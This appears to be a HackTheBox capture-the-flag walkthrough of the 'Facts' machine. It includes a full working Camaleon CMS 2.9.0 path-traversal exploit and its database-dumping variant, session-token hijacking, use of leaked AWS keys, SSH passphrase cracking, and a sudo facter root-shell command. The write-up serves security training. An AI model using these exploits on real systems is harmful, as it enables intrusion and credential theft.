+++
title = "Facts - Vulnerable CMS leads to root access"
date = 2026-05-11T11:22:35Z
tags = ["HTB - Easy", "Linux", "Pentesting"]
description = "Pwning the Facts machine from HTB."
+++
## **OVERVIEW**
*Facts* is an easy-rated Linux machine on the HackTheBox platform. Pwning the machine requires web enumeration to find a vulnerable CMS, exploitation of a known CVE for an initial foothold, and privilege escalation through a misconfigured SUID binary.
## **RECON**
After obtaining the target machine's IP address, I ran an nmap scan to identify open TCP ports:
```bash
┌──(root㉿kali)-[/home/esteban/HackTheBox]
└─# nmap -sC -sV -oN nmap_tcp.txt 10.129.53.63 --min-rate=10000
```
The scan revealed two open TCP ports for SSH and HTTP (UDP scans did not show any open ports):
```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-11 20:30 PDT
Nmap scan report for 10.129.53.63
Host is up (0.100s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
80/tcp open  http    nginx 1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/
|_http-server-header: nginx/1.26.3 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.67 seconds
```
Trying to navigate to **http://10.129.53.63:80/** redirected me to **http://facts.htb/**. I added this domain to my /etc/hosts file and revisited it.
![index page of facts](/images/facts/homepage.png)
The website was a collection of fun facts, and I noticed there were no obvious endpoints such as a "sign in" button or "about" page. To get a better scope of the web app, I ran a gobuster directory scan to find directories.
## **ENUMERATION**
```bash
┌──(root㉿kali)-[/home/esteban/HackTheBox]
└─# gobuster dir -u "http://facts.htb" -w ../SecLists/Discovery/Web-Content/common.txt -t 25 --timeout 20s
```
The only endpoint that didn't appear to be a redirect was **"/admin"**. Visiting http://facts.htb/admin took me to this page:
![admin page of facts](/images/facts/adminpage.png)
First, I tried a variety of default admin credentials but had no success. But there was an option to create an account, so I went ahead and signed up.
![creating a new user](/images/facts/registration.png)
Logging in with a new user brought me to an unprivileged dashboard. 
![dashboard of facts](/images/facts/adminpanel.png)
I browsed around the site and realized I had no access to anything besides changing my own password.  
Fortunately, this page revealed something very useful:  
**Camaleon CMS 2.9.0**  
&nbsp;  
I decided to browse ExploitDB to see if there are any known exploits for this CMS version. As it turns out, Camaleon 2.9.0 is affected by **CVE-2024-46987**, making it vulnerable to *path traversal* attacks.  
&nbsp;   
On my attacker machine, I fetched the following script from ExploitDB and converted it into a .py file:
```python
# Exploit Title: Camaleon CMS v2.9.0 - Path Traversal
# Date: 2026-02-02
# Exploit Author: Sakshi Velampudi (CyberQuestor)
# Vendor Homepage: https://github.com/owen2345/camaleon-cms
# Software Link: https://github.com/owen2345/camaleon-cms/releases/tag/2.9.0
# Version: <= 2.9.0
# Tested on: Linux
# CVE: CVE-2024-46987
# Authentication: Required (auth_token cookie)

# --------------------------------------------------
# Description
# Sends a single HTTP GET request to a vulnerable private file download endpoint
# Uses an auth_token cookie required for admin access
# Detects invalid authentication via redirect to /admin/login
# Displays a preview of the response when file retrieval succeeds

# Usage:
# Run only against systems explicitly authorized for testing
# --------------------------------------------------



"""
Camaleon CMS v2.9.0 - Path Traversal Proof of Concept

"""

import requests

print("\nCamaleon CMS v2.9.0 - Path Traversal PoC (authorized testing only)\n")

# --------------------------------------------------
# 1) Input Collection
# --------------------------------------------------
target_url = input("Target base URL (example: http://target.com): ").strip()
requested_path = input("File path to request (example: /etc/passwd): ").strip()
token = input("auth_token value: ").strip()

if not target_url or not requested_path or not token:
    print("\n[!] Error: URL, file path, and auth_token are required.\n")
    raise SystemExit(1)

# Normalize base URL to avoid malformed paths
target_url = target_url.rstrip("/")

# --------------------------------------------------
# 2) Request Construction
# --------------------------------------------------
url = (
    f"{target_url}"
    f"/admin/media/download_private_file"
    f"?file=../../../../../../{requested_path.lstrip('/')}"
)

cookies = {"auth_token": token}

# --------------------------------------------------
# 3) Request Execution
# --------------------------------------------------
# Redirects are disabled to capture authentication failures.
try:
    response = requests.get(url, cookies=cookies, timeout=10, allow_redirects=False)
except requests.exceptions.RequestException as e:
    print(f"\n[!] Request error: {e}\n")
    raise SystemExit(2)

# --------------------------------------------------
# 4) Response Handling
# --------------------------------------------------
print(f"\n[+] HTTP Status: {response.status_code}")

# Invalid authentication typically results in a redirect to the admin login page
if response.status_code == 302:
    location = response.headers.get("Location", "")
    if "/admin/login" in location:
        print(f"[!] auth_token may be incorrect or expired (redirected to {location}).")
    else:
        print(f"[!] Redirected to: {location or '(no Location header)'}")
    raise SystemExit(1)

# Successful response
if response.status_code == 200:
    print("\n[+] Response preview:\n")

    preview = response.text[:3000]
    print(preview)

    if len(response.text) > 3000:
        print("\n...output truncated...")
    raise SystemExit(0)

# Other failure conditions
print("\n[!] Request failed.")
if response.status_code == 500:
    print("[!] The file path may be invalid, or the server encountered an internal error.")

print(f"[i] Response length: {len(response.content)} bytes")
raise SystemExit(1)
```
```bash
wget https://www.exploit-db.com/raw/52531 && mv 52531 exploit.py
```
I then executed the script by specifying the target URL, file path to request, and auth_token value:
```bash
┌──(root㉿kali)-[/home/esteban/HackTheBox]
└─# python3 exploit.py                         

Camaleon CMS v2.9.0 - Path Traversal PoC (authorized testing only)

Target base URL (example: http://target.com): http://facts.htb/
File path to request (example: /etc/passwd): /etc/passwd
auth_token value: P0ChR3_MlLL7nIOhmtlIvQ&Mozilla%2F5.0+%28X11%3B+Linux+x86_64%3B+rv%3A128.0%29+Gecko%2F20100101+Firefox%2F128.0&10.10.16.37

[+] HTTP Status: 200

[+] Response preview:

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
usbmux:x:100:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:102:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:103:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:104:104::/nonexistent:/usr/sbin/nologin
uuidd:x:105:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:106:107::/nonexistent:/usr/sbin/nologin
tss:x:107:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
_laurel:x:101:988::/var/log/laurel:/bin/false
```
**Note: the "auth_token value" is a cookie which can be found in the facts.htb session, as pictured below:**
![authorization cookie](/images/facts/authcookie.png)
The exploit was able to reveal sensitive files such as **/etc/passwd**, and with that file, I was able to find two other users besides root: **trivia** and **william**.  
&nbsp;  
After doing some more digging online, I found out that Camaleon CMS is Ruby on Rails based. With this information, I was able to find documentation on rails directory structure on [**geeksforgeeks.org**](https://www.geeksforgeeks.org/ruby/ruby-on-rails-directory-structure/). The site revealed paths for some very sensitive database files, one of them being **/config/database.yml**.  
&nbsp;  
I knew that **/proc/self/cwd** was a very common path for web applications to be running from, and so I was able to read the **database.yml** file by running the exploit script and searching for **/proc/self/cwd/config/database.yml**.  
```bash
┌──(root㉿kali)-[/home/esteban/HackTheBox]
└─# python3 exploit.py                         

Camaleon CMS v2.9.0 - Path Traversal PoC (authorized testing only)

Target base URL (example: http://target.com): http://facts.htb/
File path to request (example: /etc/passwd): /proc/self/cwd/config/database.yml
auth_token value: P0ChR3_MlLL7nIOhmtlIvQ&Mozilla%2F5.0+%28X11%3B+Linux+x86_64%3B+rv%3A128.0%29+Gecko%2F20100101+Firefox%2F128.0&10.10.16.37

[+] HTTP Status: 200

[+] Response preview:

# SQLite. Versions 3.8.0 and up are supported.
#   gem install sqlite3
#
#   Ensure the SQLite 3 gem is defined in your Gemfile
#   gem "sqlite3"
#
default: &default
  adapter: sqlite3
  pool: <%= ENV.fetch("RAILS_MAX_THREADS") { 5 } %>
  timeout: 5000

development:
  <<: *default
  database: storage/development.sqlite3

# Warning: The database defined as "test" will be erased and
# re-generated from your development database when you run "rake".
# Do not set this db to the same as development or production.
test:
  <<: *default
  database: storage/test.sqlite3


# Store production database in the storage/ directory, which by default
# is mounted as a persistent Docker volume in config/deploy.yml.
production:
  primary:
    <<: *default
    database: storage/production.sqlite3
  cache:
    <<: *default
    database: storage/production_cache.sqlite3
    migrations_paths: db/cache_migrate
  queue:
    <<: *default
    database: storage/production_queue.sqlite3
    migrations_paths: db/queue_migrate
  cable:
    <<: *default
    database: storage/production_cable.sqlite3
    migrations_paths: db/cable_migrate
```
The file revealed the path of the production database: **/storage/production.sqlite3**. Since the exploit I had downloaded earlier was only for reading files, I rewrote it slightly so that it was capable of dumping SQL databases:  
&nbsp;  
So this:
```python
# Successful response
if response.status_code == 200:
    print("\n[+] Response preview:\n")

    preview = response.text[:3000]
    print(preview)

    if len(response.text) > 3000:
        print("\n...output truncated...")
    raise SystemExit(0)
```
&nbsp;  
Turned to this:
```python
# Successful response
if response.status_code == 200:
    print("\n[+] Database dumped.\n")

    with open("dump.sqlite3", "wb") as f:
        f.write(response.content)

    raise SystemExit(0)
```
I then ran the exploit and was able to obtain a dump of **production.sqlite3**. This was a big step toward getting a foothold on the system, and the tables were very promising:
```bash
┌──(root㉿kali)-[/home/esteban/HackTheBox]
└─# sqlite3 dump.sqlite3 
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
action_mailbox_inbound_emails     cama_media                      
action_text_rich_texts            cama_metas                      
active_storage_attachments        cama_posts                      
active_storage_blobs              cama_term_relationships         
active_storage_variant_records    cama_term_taxonomy              
ar_internal_metadata              cama_users                      
cama_comments                     plugins_attacks                 
cama_custom_fields                plugins_contact_forms           
cama_custom_fields_relationships  schema_migrations               
sqlite> 
```
By taking a look at the **cama_users** table, I was able to find a database entry for the admin user of **facts.htb**:
```bash
sqlite> SELECT * FROM cama_users;
1|admin|admin|admin@local.com||$2a$12$9lLBXaBzcTxohKjxX08aR.WmE7qyhwpl0NGGBLbKDi6t.PB5zdJcK|1QGOA6YxgFANPE6XlGYPpg||||2026-01-08 15:30:12.955853|2025-09-07 21:57:52.634896|2026-01-08 15:30:12.961004|-1|||1|Administrator|
5|fakeadmin|client|attacker@evil.com||$2a$12$ghGG5nwdqjg5Db8WVULqY.7HtAlUZ3.S3ipeqeKJmiIPGGFyqCRBa|P0ChR3_MlLL7nIOhmtlIvQ||||2026-05-12 17:04:46.178229|2026-05-12 17:04:17.048383|2026-05-12 17:04:46.181352|-1|||1|esteban|exploits
sqlite> 
```
The entry seemed to contain a username, email, password (hashed with bcrypt), and most importantly, an *authorization token*.  
&nbsp;  
I copied this token, went back to my web browser (still logged into my standard user account) and replaced my original auth_token with it.  
![replacing token](/images/facts/tokenescalation.png)
I refreshed the page, and BOOM. Admin access granted!
![admin access granted](/images/facts/adminaccess.png)
I noticed a bunch of tools on the left sidebar of the dashboard, however, almost all of them were a waste of time. There were not any plugins I could leverage, media that stood out, or content that I shouldn't have seen.  
&nbsp;  
However, investigating the *settings* page revealed AWS access keys and secret keys!  
![aws keys](/images/facts/aws.png)
With this information, I connected to the AWS bucket on my attacker machine:  
&nbsp;  
Setting up the configuration:
```bash
┌──(root㉿kali)-[/home/esteban/HackTheBox]
└─# aws configure                                  
AWS Access Key ID: AKIA0BFCF1A5C7112990
AWS Secret Access Key: ei0GZaLK24JLkHyLJHMKRs3WsazqkDqUt+z0Jj+i
Default region name: us-east-1
Default output format [None]:
```
Listing the buckets:
```bash
┌──(root㉿kali)-[/home/esteban/HackTheBox]
└─# aws --endpoint-url http://facts.htb:54321 s3 ls --recursive
2025-09-11 05:06:52 internal
2025-09-11 05:06:52 randomfacts
```
The bucket I was really interested in was *internal*, so I dumped it:
```bash
┌──(root㉿kali)-[/home/esteban/HackTheBox]
└─# aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/ ./internal_dump --recursive
```
I looked through the dump and found a **.ssh** folder, which brought me one step closer to getting a foothold on the target machine:
```bash
┌──(root㉿kali)-[/home/esteban/HackTheBox]
└─# cd internal_dump 
                                                           
┌──(root㉿kali)-[/home/esteban/HackTheBox/internal_dump]
└─# ls -a
.   .bash_logout  .bundle  .lesshst  .ssh
..  .bashrc       .cache   .profile

┌──(root㉿kali)-[/home/esteban/HackTheBox/internal_dump]
└─# cd .ssh         
                                                             
┌──(root㉿kali)-[/home/esteban/HackTheBox/internal_dump/.ssh]
└─# ls   
authorized_keys  id_ed25519
```
I cloned the **id_ed25519** SSH key, gave it permissions, and tested it out with the users **trivia** and **william**. The key ended up working for **trivia**, but required a passphrase.
```bash
┌──(root㉿kali)-[/home/esteban/HackTheBox]
└─# ssh -i cloned_key trivia@facts.htb          
Enter passphrase for key 'cloned_key': 
```
I had to crack the passkey by using **ssh2john** to create a hash, then passing it to **john the ripper**:
```bash
┌──(root㉿kali)-[/home/esteban/HackTheBox]
└─# ssh2john cloned_key > cloned_key_hash.txt
                                                             
┌──(root㉿kali)-[/home/esteban/HackTheBox]
└─# john cloned_key_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 24 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
dragonballz      (cloned_key)     
1g 0:00:02:57 DONE (2026-05-12 15:45) 0.005645g/s 18.06p/s 18.06c/s 18.06C/s grecia..imissu
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Found the passphrase- **dragonballz**.
## **FOOTHOLD**
With the passphrase successfully cracked, I was able to SSH into the target machine as the user, **trivia**.
```bash
┌──(root㉿kali)-[/home/esteban/HackTheBox]
└─# ssh -i cloned_key trivia@facts.htb
Enter passphrase for key 'cloned_key': 
Last login: Wed Jan 28 16:17:19 UTC 2026 from 10.10.14.4 on ssh
Welcome to Ubuntu 25.04 (GNU/Linux 6.14.0-37-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue May 12 10:53:40 PM UTC 2026

  System load:           0.03
  Usage of /:            72.1% of 7.28GB
  Memory usage:          19%
  Swap usage:            0%
  Processes:             221
  Users logged in:       1
  IPv4 address for eth0: 10.129.53.63
  IPv6 address for eth0: dead:beef::a0de:adff:fec7:c0dd


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
trivia@facts:~$ id
uid=1000(trivia) gid=1000(trivia) groups=1000(trivia)
```
First, I grabbed the user flag located in **/home/william**:
```bash
trivia@facts:~$ cd /home/william
trivia@facts:/home/william$ cat user.txt
18a356a9ca5da53e609ac4766ddb6ecf
```
I then internally enumerated the system to find privilege escalation vectors.   
&nbsp;  
Running **sudo -l** showed something promising:
```bash
trivia@facts:~$ sudo -l
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```
## **PRIVESC**
Seeing that **trivia** can use the **facter** bin with no password, I did some digging on [**GTFObins**](https://gtfobins.org/gtfobins/facter/) to figure out an exploit.  
&nbsp;  
By running the following command, the first **.rb** file in the target directory would be executed:
```bash
facter --custom-dir=/path/to/dir/ x
```
All that I had to do was create a malicious **.rb** file in a writeable directory to spawn a root shell. And so that's exactly what I did!
```bash
trivia@facts:~$ echo 'system("/bin/bash")' > /tmp/gimmeroot.rb
trivia@facts:~$ sudo facter --custom-dir=/tmp x  
  
root@facts:/home/trivia# 
```
Just like that, we successfully popped a root shell! I grabbed the flag at **/root/root.txt**:
```bash
root@facts:/home/trivia# cd /root
root@facts:~# ls
minio-binaries  ministack  root.txt  snap
root@facts:~# cat root.txt
4d1e72146cfe282630337292c2b7df01
```
## **TAKEAWAYS**
I feel like this machine was very straightforward and reinforced both my web and internal enumeration skills. The Camaleon CMS vulnerability served as a great reminder for why it's always useful to check service versions during recon. The privesc technique I had to use to pop a root shell was also a great showcase of how powerful misconfigured SUID binaries can be for an attacker.